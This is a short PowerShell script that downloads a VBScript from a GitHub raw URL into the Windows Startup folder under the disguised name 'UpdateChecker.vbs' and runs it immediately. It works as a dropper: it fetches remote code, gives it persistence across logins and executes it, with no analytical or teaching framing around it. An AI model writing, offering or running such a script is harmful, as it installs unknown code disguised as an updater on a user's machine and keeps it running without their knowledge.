$url = "https://raw.githubusercontent.com/AmjadBalls/TEST/refs/heads/main/Discord.vbs"
$dest = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\UpdateChecker.vbs"
Invoke-WebRequest -Uri $url -OutFile $dest
Start-Process $dest
